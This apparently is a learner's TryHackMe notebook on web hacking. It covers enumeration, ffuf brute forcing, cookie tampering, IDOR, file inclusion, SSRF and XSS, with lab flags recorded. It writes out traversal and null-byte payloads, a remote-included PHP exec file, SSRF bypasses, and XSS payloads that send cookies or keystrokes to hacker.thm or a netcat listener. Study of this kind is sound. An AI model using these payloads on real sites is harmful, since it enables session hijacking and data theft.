# Penetration Testing Notes

# Try Hack Me

# Intro to Web Hacking

- [Penetration Testing Notes](#penetration-testing-notes)
- [Try Hack Me](#try-hack-me)
- [Intro to Web Hacking](#intro-to-web-hacking)
  - [Walking an Application](#walking-an-application)
  - [Content Discovery](#content-discovery)
    - [Manual Discovery - Robots.txt](#manual-discovery---robotstxt)
    - [Manual Discovery - Favicon](#manual-discovery---favicon)
    - [Manual Discovery - Sitemap.xml](#manual-discovery---sitemapxml)
    - [Manual Discovery - HTTP Headers](#manual-discovery---http-headers)
    - [Manual Discovery - Framework Stack](#manual-discovery---framework-stack)
    - [OSINT - Google Hacking / Dorking](#osint---google-hacking--dorking)
    - [OSINT - Wappalyzer](#osint---wappalyzer)
    - [OSINT - Wayback Machine](#osint---wayback-machine)
    - [OSINT - Github](#osint---github)
    - [OSINT - S3 Buckets](#osint---s3-buckets)
    - [Automated Discovery](#automated-discovery)
      - [Tools](#tools)
  - [Subdomain Enumeration](#subdomain-enumeration)
    - [OSINT - SSL/TLS Certificates](#osint---ssltls-certificates)
    - [OSINT - Search Engines](#osint---search-engines)
    - [DNS Bruteforce](#dns-bruteforce)
    - [OSINT Sublist3r](#osint-sublist3r)
    - [Virtual Hosts](#virtual-hosts)
    - [Authentication Bypass](#authentication-bypass)
    - [Brute Force](#brute-force)
    - [Logic Flaw](#logic-flaw)
  - [Cookie Tampering](#cookie-tampering)
    - [Hash cracking](#hash-cracking)
  - [IDOR](#idor)
    - [Encoding](#encoding)
    - [Hashing](#hashing)
    - [Unpredicatble IDs](#unpredicatble-ids)
    - [Where IDORs are located?](#where-idors-are-located)
    - [Practical IDOR example](#practical-idor-example)
  - [File Inclusion](#file-inclusion)
    - [Lab 1 - Local File Inclusion](#lab-1---local-file-inclusion)
  - [Remote File Inclusion - RFI](#remote-file-inclusion---rfi)
  - [Chalenges](#chalenges)
    - [Challenge 1](#challenge-1)
    - [Challenge 2](#challenge-2)
    - [Challenge 3](#challenge-3)
  - [Intro to SSRF](#intro-to-ssrf)
    - [SSRF Examples](#ssrf-examples)
    - [Finding an SSRF](#finding-an-ssrf)
    - [Defeating Common SSRF Defenses](#defeating-common-ssrf-defenses)
      - [Deny List](#deny-list)
      - [Allow List](#allow-list)
      - [Open Redirect](#open-redirect)
    - [SSRF Practical](#ssrf-practical)
  - [Intro to Cross-site Scripting](#intro-to-cross-site-scripting)
    - [Proof of Concepts](#proof-of-concepts)
    - [Reflected XSS](#reflected-xss)
    - [Stored XSS](#stored-xss)
    - [DOM Based XSS](#dom-based-xss)
    - [Blind XSS](#blind-xss)
    - [Perfecting your payload](#perfecting-your-payload)
      - [Level 1](#level-1)
      - [Level 2](#level-2)
      - [Level 3](#level-3)
      - [Level 4](#level-4)
      - [Level 5](#level-5)
      - [Level 6](#level-6)
      - [Polygots](#polygots)
    - [Practical Example (Blind XSS)](#practical-example-blind-xss)
  - [Command Injection](#command-injection)
    - [Who broke my lock?](#who-broke-my-lock)
    - [AH! Dont' Look](#ah-dont-look)


## Walking an Application

HTML Comments 

<!-- This is an example comment-->

Look for where things are stored. Attempt to explore directories where files or images are stored.

Check page source to attempt to identify if the site is using a common framework and try to identify version and if any vulnerabilities are present. 

**Developer Tools - Inspect**

Inspect elements to be able to edit things like CSS styles. In this lab you can edit the CSS style block to none to remove the payall

**Developer Tools - Debugger**
Called Sources in Google Chrome

Clicking {} at the bottom of the debugger enable pretty print and makes the javascript more readable. 

If you click the line number you insert a break point, this tells the website to stop before this line of code. 

In this lab if you insert the breakpoint

**Developer Tools -Network**

Keeps track of every external web request. Check the requests and their responses.

## Content Discovery

Manual, Automated, and OSINT

### Manual Discovery - Robots.txt

Viewing the robots.txt can show you which parts of the site are not indexed by search engines. 

Example: 

Disallow: /staff-portal

### Manual Discovery - Favicon

Can be used to identify framework used if not updated by developer

OWASP has a database of favicon icons to identify - https://wiki.owasp.org/index.php/OWASP_favicon_database

This uses md5 hashes to identify the framework used

Use curl "FAVICON ADDRESS" | md5sum to get the hash. Search on OWASP database to identify framework.

### Manual Discovery - Sitemap.xml

Lists every file website owner wants listed in search engines.

Check sitemap for areas of the website that may not be publically available or suspicious, curious areas.

### Manual Discovery - HTTP Headers

Headers can sometimes include useful information, webserver software/programming language used. Can be used to find vulnerable versions.

Run curl "SITE ADDRESS" -v

### Manual Discovery - Framework Stack

Either by comments in the page source or by the favicon, once the framework is discovered that can be used to find ways to exploit. In this lab the method was to review the documentaiton for the administrator login page and test default credentials that hadn't been changed. 

### OSINT - Google Hacking / Dorking

**Examples**

site
	site:tryhackme.com
	returns results only from the specified website address
inurl
	inurl:admin
	returns results that have the specified word in the URL
filetype
	filetype:pdf
	returns results which are a particular file extension
intitle
	intitle:admin
	returns results that contain the specified word in the title

### OSINT - Wappalyzer

Online tool and browser extension to identify what technologies a website uses, such as frameworks CMS and more. 

### OSINT - Wayback Machine

Utilize this to discover old pages that may still be active on the website. 

### OSINT - Github

Search for repo's for companies you are targeting. See what information you can uncover, passwords, source code, etc. 

### OSINT - S3 Buckets

S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.

### Automated Discovery

Worlists. 

#### Tools

These tools can be used to automate discovery. You can import common wordlists and scan websites for directories or files that exist in the wordlists. See the tools below:

**ffuf**
  
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.77.145/FUZZ    

**dirb**
          
dirb http://10.10.77.145/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  
      
**Gobuster**
           
gobuster dir --url http://10.10.77.145/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

## Subdomain Enumeration

Methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host

### OSINT - SSL/TLS Certificates

Certificate Transparency Logs - Public logs of every SSL/TLS certificate created for domain name. 

Use to advantage to discover subdomains belonging to domain. Sites like https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui 

### OSINT - Search Engines

Google dorking - discover subdomains

site:*tryhackme.com

### DNS Bruteforce

Try a large number of different possibilities from a pre-defined list of commonly used subdomains. Automated with tools. DNSrecon request

### OSINT Sublist3r

Automated discovery using Sublist3r.

### Virtual Hosts

Tools like ffuf can be used to automate subdomain disovery for virtual hosts. Need to eliminate false positives, run command and identify most common size of request and filter out.

Examples:

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.94.145

Most common size from this request was 2395

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.94.145 -fs 2395

Discovered two positive results after filtering out false positives.

### Authentication Bypass

Ways website authentication methods can be bypassed

Creating a list of valid usernames. You can use account registration pages to try common account names, errors can reveal that an account with that name already exists. 

admin

ffuf can be used to automate and build a list of valid usernames by using a wordlist. 

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.197.96/customers/signup -mr "username already exists"

-w selects the wordlist
-x specifies request method, GET is default. When filling the form this is a POST request
-d specifies the data you send we have the fields username, email, password and cpassword.
-H adds addaitonal header sto request, this case setting Content-Type so the web server knows we are sending form data.
-mr uses regex to identify the text on the page used to validate a valid username

admin, robert, steve, simon

### Brute Force

Brute forcing w/ fuff, using the valid_usernames.txt file that we created with the valid usernames enumerated in the prior step

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.197.96/customers/login -fc 200

W1 is the first keyword used to insert the valid username
W2 is the list of passwords
-w argument is used and word lists are separated with a comma

-fc argument is used to check for an HTTP status code other than 200

302 was the status when a username was found

steve/thunder

### Logic Flaw

When a typical logical path of an application is bypassed, circumvented or manipulated by a hacker. 

Exploit reset password function on test site

## Cookie Tampering

curl http://10.10.165.162/cookie-test
- Returns not logged in

curl -H "Cookie: logged_in=true; admin=false" http://10.10.165.162/cookie-test

- The -H flag adds teh coockie header that we manipulated
- Receives message stating Logged in As A User

### Hash cracking

crackstation.net

## IDOR

Insecure Direct Objec Reference - type of access control vulnerability

### Encoding

base64 is often used to encode web data. You can decode, manipulate, and encode. Often end in a =

### Hashing

Things can also be hashed, when a hash is discovered its worthy runing through crackstation.net to see if they have the cracked hash

### Unpredicatble IDs 

If you cant decode or crack the hash of a user id for example you can create a test account and attempt to swap the id of the test account with the true account. If you can view the toehrs content you found an IDOR. 

### Where IDORs are located?

Might be in an AJAX request or something referenced in a Javascript file. 

### Practical IDOR example

Check get request for items like userids, try to manipulate ids to get information such as account names and emails. 

This could be used to enhance a brute force attack or password spraying attack.

## File Inclusion

Local File Inclusion, Remote File Inclusion, and directory traversal.

### Lab 1 - Local File Inclusion

PHP functions such as include, require, include_once, and require_once contribute to vulnerable we applications. 

http://10.10.215.91/lab2.php?file=test.php

This request can be manipulated. Test the ../ vulnerability, try to get things like /etc/passwd or moving around directories

Null bytes can be used to bypass input that has defined input at the end. Tricks web applications into discarding everything after the null byte. 

**%00** or **0x00** in hex

PHP was used in this lab along with the file_get_contents and includes function. 

Sending invalid data was used to reveal error codes that showed how the data was being processed. 

../../../../etc/passwd could be used as a payload, an example of directory traversal. 

Sometimes the app would apply .php to the end of any input the null byte was used to bypass this, make sure to try in request bar or developer tools

Pay attention to how the data is being passed, it was filtered in some instances, doubleing things could bypass a filter for example ../ could be filtered and removed, in this case ....// was used as the initial ../ was stripped out. 

## Remote File Inclusion - RFI

Allows an attacker to inject external URL into include function. One requirement for RFI is that the allow_url_fopen needs to be on. Allows RCE


## Chalenges

### Challenge 1

Capture Flag1 at /etc/flag1

The input form is broken so we have to use manual curl requests

curl -x POST [options] [URL] - curl request format

The challenge tells us that the form is broken and we need to send a curl request with the 'file' parameter.

- Researched how to send CURL requests
- Sent a test curl request
  - curl -X POST -d 'file=test.php' http://10.10.221.7/challenges/chall1.php
    - Got a response from the server, showed the PHP include function
- Sent a 2nd curl request attempting to traverse directories to /etc/flag1
  - curl -X POST -d 'file=../../../../etc/flag1' http://10.10.221.7/challenges/chall1.php
    - flag was `F1x3d-iNpu7-f0rrn`

### Challenge 2

Capture the Flag2 at /etc/flag2

- Sending the same curl request but with flag 2 results in the webiste saying flag 2 is not allowed
  - Attempted to bypass filtering, didnt change anything, just got an error. Likely not a filter
  - Hint in try hack me says to check cookies
  - Changed cookie Name: THM value to Admin, received a Welcome Admin message, manually using dev tools
    - I had to look this one up. 
  - When dealing with pages that are authenticated it is important to check the cookie. The cookie can also be used to perform directory traversal
    - Change cookie value to ../../../../etc/flag2 and you will notice it is adding .php
    - Use the null byte %00 and send ../../../etc/flag2%00 and you will get the flag

### Challenge 3

Gain RCE in /playground.txt

- Researhced PHP RCE utilizing a remote file inclusion. 
- Create a malicious PHP file the exectues a function, in this case the hostname function which was the flag. 
- PHP code: `<?php exec('hostname', $output); echo $output[0]; ?>`
- At first I tried to install apache and run a webserver to host the file on the attack box, it failed for some reason. I researched and learned that python3 has a built in http module that can host a simple web server. 
  - Created cmd.txt with the malicious php code
  - Ran the python webserver
  - Navigated to playground.php page
  - For file name, gave: `http://10.10.14.78:8000/cmd.txt`
  - When pressing the include the hostname of the webserver, remote webserver ran the malicious code and the hostname `http://10.10.14.78:8000/cmd.txt` was returned. 

## Intro to SSRF

- Regular SSRF, data is returned to the users screen.
- Blind SSRF, SSRF occurs but no information is returned to the attackers screen

SSRF can result in the following

- Access to unauthorised areas
- Access to customer/org data
- Ability to scale internal networks
- Reveal authentication tokens/credentials

### SSRF Examples

Challenge - Change the address in the browser below to force the webserver to request https://server.website.thm/flag?id=9

`https://website.thm/item/2?server=server.website.thm/flag?id=9&x=`

The server requests https://server.website.thm/flag?id=9&x=.website.thm/api/item?id=2

The `&x=` at the end of the payload makes the webserver ignore the `.website.thm/api/item?id=2` at the end of the request

- Flag = THM{SSRF_MASTER}

### Finding an SSRF

Spotted in a variety of ways

1. When a full URL is used in a parameter in the address bar
   ![alt text](image.png)
2. Hidden in a form field
   ![alt text](image-1.png)
3. Partial URL such as just the hostname
   ![alt text](image-2.png)
4. Or only the path of the URL
   ![alt text](image-3.png)

If working with blind SSRF where no output is reflected back to you you'll need to use an external HTTP logging tool to monitor request such as requestbin.com, your own HTTP server, or Burp Suites Collaborator client

### Defeating Common SSRF Defenses

#### Deny List
- All requests are accepted apart from resources specified in a list or matching a particular pattern.
  - Localhost may be restrpicted, you can use alternative localhost references to bypass, or a subdomain that has a DNS record that resolves to localhost
  - In cloud environments block acces to IP 169.254.169.254, contains metadata for the deployed cloud server with possibly sensitive information

#### Allow List
- All requets get denied unless on a list or match a particular pattern. 

#### Open Redirect
- Feature can be misused by attackers, especially when combined with another security issue like SSRF (Server-Side Request Forgery). SSRF typically lets an attacker trick the server into making requests to unintended locations. Suppose the server is only supposed to allow requests to its own domain (like https://website.thm/). An attacker could exploit the open redirect feature to bypass this restriction and redirect the server to a different, possibly malicious, domain. This makes open redirects a potential security risk if not properly handled.

### SSRF Practical

## Intro to Cross-site Scripting

Payload - JavaScript code to be executed on the targets computer. Intention and Modification

Intention is what you wish the javascript to do, modification is changes to the code to make it execute as we want

### Proof of Concepts

**Simple Payload** - `<script>alert('XSS');</script>`

**Session Stealing** - `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
- Steals details of a users session, login tokens, in cookies on targets machine
- Script steals cookie, base64 encodes the cookie, posts to website under hackers control. Can take over cookies and the targets session. 

**Key Logger** - `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- Acts as a keylogger

**Business Logic** - `<script>user.changeEmail('attacker@hacker.thm');</script>`

### Reflected XSS
Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**How to test for Reflected XSS:**

You'll need to test every possible point of entry; these include:

    Parameters in the URL Query String
    URL File Path
    Sometimes HTTP Headers (although unlikely exploitable in practice)

Attacker has to craft a malicious link that includes XSS, then distribute that to victims. 

Then when the victim uses the malicious link the code is ran that can be used by the attacker

### Stored XSS

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

    Comments on a blog
    User profile information
    Website Listings

### DOM Based XSS

Document Object Model

DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

    innerHTML and outerHTML:
        These properties allow JavaScript to write HTML content directly to an element. If user-controlled input is unsanitized and used with innerHTML or outerHTML, it can lead to the execution of malicious scripts.

    document.write and document.writeln:
        These methods write directly to the HTML document and can execute script tags if the input is not properly sanitized. These are especially risky when used with data that comes directly from URL parameters or other user inputs.

    eval():
        The eval() function evaluates a string as JavaScript code. If this function is used with strings that include user-controlled input, it can lead to arbitrary code execution.

    setTimeout() and setInterval():
        These timing functions can evaluate strings as code, similar to eval(). If user input constructs the string, it can lead to XSS.

    Function constructor:
        Similar to eval(), the Function constructor can create new function instances from strings containing JavaScript code. If these strings are tainted by user input, it could lead to XSS.

    innerHTML vs. textContent:
        While textContent properly escapes HTML tags and is considered safe for inserting text, innerHTML does not, which makes it a target for injecting executable HTML/JavaScript.

    URL manipulation:
        Methods like location.href, location.search, location.hash, and URLSearchParams can be used to manipulate or retrieve the URL. If these are improperly used or unsanitized, they can be exploited to alter the document content or execute JavaScript.

    setAttribute:
        This method can be used to set attributes of HTML elements. If attributes like href, src, or event handlers (onclick, onload, etc.) are set using user input without proper sanitization, it can lead to XSS.

    jQuery methods:
        jQuery library methods such as .html(), .append(), .prepend(), and others that modify the DOM can also lead to XSS if they're used with unsanitized user input.

### Blind XSS

Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is XSS Hunter Express. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

### Perfecting your payload

#### Level 1
Test Payload to Generate Alert - `<script>alert('THM');</script>`

Works because payload is reflected in the html

#### Level 2

Test payload above doesn't work because its in a value attribute, the `<input value=PAYLOAD>`

Need to escape the input value

`"><script>alert('THM');</script>` - `">` closes the value parameter and then closes the input tab

#### Level 3

The input value this time gets reflected inside and HTML tag, this time a textarea tag. Still have to escape the tag, just a little differently. `</textarea><script>alert('THM');</script>`

#### Level 4

You'll have to escape the existing JavaScript command, so you're able to run your code; you can do this with the following payload ';alert('THM');//  which you'll see from the below screenshot will execute your code. The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.

`';alert('THM');//`

#### Level 5

Strips the word script from the user input, to bypass this we can use a payload like this:

`<sscriptcript>alert('THM');</sscriptcript>`

#### Level 6

Enter an image path. When trying the payload `"><script>alert('THM');</script>` the <> characters get filtered out, for this case we can use the additonal attributed of the IMG tag. Onload event. Change the payload to this:

`/images/cat.jpg" onload="alert('THM');`

#### Polygots

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully. 

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

### Practical Example (Blind XSS)

Creating a support ticket and the text of the ticket when entered and created ist stored in a <textarea> tag, we can try to escape that with the following payload: `</textarea>test` which works. We then can try to run some javascript with this payload `</textarea><script>alert('THM');</script>`, which also works. We get an alert from the payload. 

We can use this as a support person would likely end up vieweing the ticket. To capture their cookies and elevate privileges we can use XSS to hijack their logn session. 

1. Set up a listening server using netcat - `nc -nlvp 9001`
   1. If we want to listen on port 9001, we issue the command nc -l -p 9001. The -l option indicates that we want to use Netcat in listen mode, while the -p option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add -n; moreover, to discover any errors, running Netcat in verbose mode by adding the -v option is recommended. The final command becomes nc -n -l -v -p 9001, equivalent to nc -nlvp 9001
2. Now that the lisening server is up we need to build the payload. 
   1. `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
   2. Let’s break down the payload:
    The </textarea> tag closes the text area field.
    The <script> tag opens an area for us to write JavaScript.
    The fetch() command makes an HTTP request.
    URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
    PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
    ?cookie= is the query string containing the victim’s cookies.
    btoa() command base64 encodes the victim’s cookies.
    document.cookie accesses the victim’s cookies for the Acme IT Support Website.
    </script>closes the JavaScript code block.

The users cookies will eventually come through on the listener. It will be base64 encoded and need to be decoded. Decode the information to reveal the value of the staff-session cookie.

cookie value = 4AB305E55955197693F01D6F8FD2D321

## Command Injection

































### Who broke my lock?

Goal: Bruteforce Administrators Password

1. Capture logon request via burb
2. Insert position for password
3. Load wordlist
4. Run Sniper attack to bruteforce password
   1. Wait for Sniper to finish
      1. Response code 200 (succes) received for password "admin123" with username admin@juice-sh.op

### AH! Dont' Look

Goal: Access the confidential document

FTP directory is exposed to public and is shown due to linking a file in About us page. Navigate to SITEIP/ftp and downloaded confidential file. 

Goal 2: Log into MC SafeSearch's account

Goal 3: Download the Backup file

Need to use a character bypass called Poinson Null Byte - %00 - URL encoded %2500